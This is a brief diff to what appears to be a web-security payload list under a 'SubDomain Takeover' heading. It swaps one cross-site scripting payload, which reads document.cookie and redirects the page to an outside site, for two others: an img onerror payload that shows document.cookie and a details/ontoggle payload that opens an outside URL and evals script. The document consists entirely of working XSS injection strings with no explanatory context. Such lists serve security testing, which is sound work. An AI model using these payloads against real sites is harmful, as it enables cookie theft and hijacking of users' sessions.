@@ -3,4 +3,5 @@
 SubDomain Takeover
 
 
-<iframe>13"-->">'` -- `<!--<img src="--><img src=x onerror=(prompt)(`Ex.Mi`);(prompt)(document.cookie);location=`https://ex-mi.ru`;>
+"><img src=x onerror=alert(document.cookie)>
+<details open ontoggle=window.open("https://www.doyensec.com");win.eval("alert(document.domain)");>
